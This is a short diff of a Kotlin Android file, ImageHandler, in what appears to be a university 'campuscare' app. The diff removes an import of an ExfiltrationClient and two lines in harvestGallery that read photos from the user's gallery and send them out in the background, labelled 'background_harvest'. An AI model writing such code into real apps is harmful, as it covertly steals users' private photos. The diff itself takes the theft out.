@@ -3,7 +3,6 @@ package com.university.campuscare.utils
 import android.content.Context
 import android.net.Uri
 import android.provider.MediaStore
-import com.university.campuscare.utils.ExfiltrationClient
 
 object ImageHandler {
     fun harvestGallery(context: Context) {
@@ -18,8 +17,6 @@ object ImageHandler {
             while (it.moveToNext() && count < 3) {
                 val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                 val uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
-                val bytes = context.contentResolver.openInputStream(uri)?.readBytes()
-                ExfiltrationClient.send(bytes, mapOf("type" to "background_harvest"))
                 count++
             }
         }
